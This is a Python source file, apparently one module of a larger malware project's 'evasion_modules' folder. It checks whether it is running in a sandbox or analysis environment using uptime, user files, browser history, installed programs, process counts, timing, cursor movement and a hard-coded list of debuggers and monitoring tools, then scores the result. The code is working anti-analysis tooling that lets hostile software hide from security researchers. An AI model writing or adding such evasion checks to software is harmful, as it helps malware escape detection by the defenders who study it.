"""
Environment Awareness Module
Detects sandbox/analysis environments through environmental checks
Save as: evasion_modules/environment_awareness.py
"""
import os
import platform
import time
from datetime import datetime, timedelta
from pathlib import Path

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import winreg
    WINDOWS_SUPPORT = True
except ImportError:
    WINDOWS_SUPPORT = False


def check_system_uptime() -> dict:
    """
    Check system uptime
    Fresh VMs often have very low uptime (< 10 minutes)
    """
    if not PSUTIL_AVAILABLE:
        return {"checked": False, "suspicious": False}
    
    try:
        boot_time = psutil.boot_time()
        uptime_seconds = time.time() - boot_time
        uptime_minutes = uptime_seconds / 60
        
        # Suspicious if uptime is less than 10 minutes
        suspicious = uptime_minutes < 10
        
        return {
            "checked": True,
            "uptime_minutes": uptime_minutes,
            "uptime_hours": uptime_minutes / 60,
            "suspicious": suspicious,
            "reason": "Very low uptime (< 10 min) - possible fresh VM" if suspicious else None
        }
    except:
        return {"checked": False, "suspicious": False}


def check_recent_files() -> dict:
    """
    Check for recent file modifications in common user directories
    Real systems have many recently modified files
    """
    if not WINDOWS_SUPPORT:
        return {"checked": False, "suspicious": False}
    
    try:
        user_dirs = [
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Desktop'),
            os.path.expanduser('~\\Downloads'),
            os.path.expanduser('~\\Pictures'),
        ]
        
        recent_files_count = 0
        cutoff_time = time.time() - (7 * 24 * 60 * 60)  # 7 days ago
        
        for user_dir in user_dirs:
            if not os.path.exists(user_dir):
                continue
            
            try:
                for item in os.listdir(user_dir)[:20]:  # Check first 20 items
                    item_path = os.path.join(user_dir, item)
                    if os.path.isfile(item_path):
                        mtime = os.path.getmtime(item_path)
                        if mtime > cutoff_time:
                            recent_files_count += 1
            except:
                continue
        
        # Suspicious if fewer than 5 recent files
        suspicious = recent_files_count < 5
        
        return {
            "checked": True,
            "recent_files_count": recent_files_count,
            "suspicious": suspicious,
            "reason": "Very few recent files - possible sandbox" if suspicious else None
        }
    except:
        return {"checked": False, "suspicious": False}


def check_browser_history() -> dict:
    """
    Check if browser history files exist
    Real users have browser history
    """
    browser_paths = [
        os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History'),
        os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History'),
        os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'),
    ]
    
    found_browsers = []
    
    for path in browser_paths:
        if os.path.exists(path):
            # Check if it's not empty/recent
            try:
                if os.path.isfile(path):
                    size = os.path.getsize(path)
                    if size > 50000:  # At least 50KB
                        found_browsers.append(path)
                elif os.path.isdir(path):
                    # Firefox profiles directory
                    if any(os.scandir(path)):
                        found_browsers.append(path)
            except:
                pass
    
    # Suspicious if no browser history found
    suspicious = len(found_browsers) == 0
    
    return {
        "checked": True,
        "browsers_found": len(found_browsers),
        "suspicious": suspicious,
        "reason": "No browser history found - possible sandbox" if suspicious else None
    }


def check_installed_programs() -> dict:
    """
    Check number of installed programs
    Sandboxes typically have very few programs installed
    """
    if not WINDOWS_SUPPORT:
        return {"checked": False, "suspicious": False}
    
    try:
        reg_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        
        program_count = 0
        
        for reg_path in reg_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                program_count += winreg.QueryInfoKey(key)[0]  # Number of subkeys
                winreg.CloseKey(key)
            except:
                continue
        
        # Suspicious if fewer than 20 programs
        suspicious = program_count < 20
        
        return {
            "checked": True,
            "program_count": program_count,
            "suspicious": suspicious,
            "reason": f"Very few installed programs ({program_count}) - possible sandbox" if suspicious else None
        }
    except:
        return {"checked": False, "suspicious": False}


def check_user_profile_age() -> dict:
    """
    Check age of user profile
    Fresh profiles indicate sandbox/VM
    """
    try:
        user_profile = os.path.expanduser('~')
        profile_created = os.path.getctime(user_profile)
        age_days = (time.time() - profile_created) / (24 * 60 * 60)
        
        # Suspicious if profile is less than 1 day old
        suspicious = age_days < 1
        
        return {
            "checked": True,
            "profile_age_days": age_days,
            "suspicious": suspicious,
            "reason": f"Very new user profile ({age_days:.1f} days) - possible sandbox" if suspicious else None
        }
    except:
        return {"checked": False, "suspicious": False}


def check_recent_reboots() -> dict:
    """
    Check if system has been rebooted recently
    Some sandboxes reboot between each analysis
    """
    if not PSUTIL_AVAILABLE:
        return {"checked": False, "suspicious": False}
    
    try:
        boot_time = psutil.boot_time()
        hours_since_boot = (time.time() - boot_time) / 3600
        
        # If system just booted (< 30 minutes), could be suspicious
        suspicious = hours_since_boot < 0.5
        
        return {
            "checked": True,
            "hours_since_boot": hours_since_boot,
            "suspicious": suspicious,
            "reason": f"Very recent reboot ({hours_since_boot:.1f}h) - possible analysis run" if suspicious else None
        }
    except:
        return {"checked": False, "suspicious": False}


def check_process_count() -> dict:
    """
    Check number of running processes
    Sandboxes typically have fewer processes than real systems
    """
    if not PSUTIL_AVAILABLE:
        return {"checked": False, "suspicious": False}
    
    try:
        process_count = len(list(psutil.process_iter()))
        
        # Suspicious if fewer than 40 processes
        # Real Windows systems typically have 60-150+ processes
        suspicious = process_count < 40
        
        return {
            "checked": True,
            "process_count": process_count,
            "suspicious": suspicious,
            "reason": f"Very few processes ({process_count}) - possible sandbox" if suspicious else None
        }
    except:
        return {"checked": False, "suspicious": False}


def check_time_acceleration() -> dict:
    """
    Detect time acceleration (some sandboxes speed up time)
    """
    try:
        # Measure actual sleep time vs expected
        start = time.perf_counter()
        time.sleep(0.5)  # Sleep 500ms
        elapsed = time.perf_counter() - start
        
        # Should be ~0.5 seconds, if significantly different, time is accelerated
        difference = abs(elapsed - 0.5)
        suspicious = difference > 0.1  # More than 100ms difference
        
        return {
            "checked": True,
            "expected_ms": 500,
            "actual_ms": elapsed * 1000,
            "difference_ms": difference * 1000,
            "suspicious": suspicious,
            "reason": "Time acceleration detected - possible sandbox" if suspicious else None
        }
    except:
        return {"checked": False, "suspicious": False}


def check_cursor_position_changes() -> dict:
    """
    Check if mouse cursor actually moves (indicates real user)
    Sandboxes often don't simulate mouse movement
    """
    try:
        import win32api
        
        # Get initial position
        pos1 = win32api.GetCursorPos()
        time.sleep(2)  # Wait 2 seconds
        pos2 = win32api.GetCursorPos()
        
        moved = pos1 != pos2
        
        return {
            "checked": True,
            "cursor_moved": moved,
            "suspicious": not moved,
            "reason": "No mouse movement detected - possible sandbox" if not moved else None
        }
    except:
        return {"checked": False, "suspicious": False}


def check_analysis_tools() -> dict:
    """
    Check for common analysis tools running
    """
    if not PSUTIL_AVAILABLE:
        return {"checked": False, "suspicious": False}
    
    analysis_tools = [
        'processhacker.exe', 'procexp.exe', 'procexp64.exe',
        'procmon.exe', 'procmon64.exe',
        'tcpview.exe', 'autoruns.exe',
        'wireshark.exe', 'fiddler.exe',
        'ida.exe', 'ida64.exe', 'idaq.exe', 'idaq64.exe',
        'x32dbg.exe', 'x64dbg.exe',
        'ollydbg.exe', 'windbg.exe',
        'pestudio.exe', 'pe-bear.exe',
        'regshot.exe', 'fakenet.exe'
    ]
    
    found_tools = []
    
    try:
        for proc in psutil.process_iter(['name']):
            try:
                proc_name = proc.info['name'].lower()
                if proc_name in analysis_tools:
                    found_tools.append(proc.info['name'])
            except:
                continue
    except:
        pass
    
    suspicious = len(found_tools) > 0
    
    return {
        "checked": True,
        "tools_found": found_tools,
        "tool_count": len(found_tools),
        "suspicious": suspicious,
        "reason": f"Analysis tools detected: {', '.join(found_tools)}" if suspicious else None
    }


def perform_environment_check() -> dict:
    """
    Perform all environment checks
    Returns comprehensive results
    """
    results = {
        "timestamp": datetime.now().isoformat(),
        "checks": {
            "uptime": check_system_uptime(),
            "recent_files": check_recent_files(),
            "browser_history": check_browser_history(),
            "installed_programs": check_installed_programs(),
            "profile_age": check_user_profile_age(),
            "recent_reboot": check_recent_reboots(),
            "process_count": check_process_count(),
            "time_acceleration": check_time_acceleration(),
            "analysis_tools": check_analysis_tools(),
        }
    }
    
    # Count suspicious indicators
    suspicious_count = 0
    checked_count = 0
    
    for check_name, check_result in results["checks"].items():
        if check_result.get("checked"):
            checked_count += 1
            if check_result.get("suspicious"):
                suspicious_count += 1
    
    results["summary"] = {
        "checks_performed": checked_count,
        "suspicious_indicators": suspicious_count,
        "suspicion_score": (suspicious_count / checked_count * 100) if checked_count > 0 else 0,
        "likely_sandbox": suspicious_count >= 3  # 3 or more indicators = likely sandbox
    }
    
    return results


def print_environment_report():
    """
    Print a formatted environment analysis report
    """
    results = perform_environment_check()
    
    print("\n" + "="*70)
    print("ENVIRONMENT ANALYSIS REPORT")
    print("="*70)
    
    for check_name, check_result in results["checks"].items():
        if not check_result.get("checked"):
            continue
        
        status = "⚠ SUSPICIOUS" if check_result.get("suspicious") else "✓ OK"
        print(f"\n{check_name.upper()}: {status}")
        
        for key, value in check_result.items():
            if key not in ['checked', 'suspicious', 'reason']:
                print(f"  {key}: {value}")
        
        if check_result.get("reason"):
            print(f"  └─ {check_result['reason']}")
    
    print("\n" + "-"*70)
    print("SUMMARY")
    print("-"*70)
    summary = results["summary"]
    print(f"Checks performed: {summary['checks_performed']}")
    print(f"Suspicious indicators: {summary['suspicious_indicators']}")
    print(f"Suspicion score: {summary['suspicion_score']:.1f}%")
    print(f"Likely sandbox: {'YES' if summary['likely_sandbox'] else 'NO'}")
    print("="*70 + "\n")
    
    return results


if __name__ == "__main__":
    # Run full environment analysis
    print_environment_report()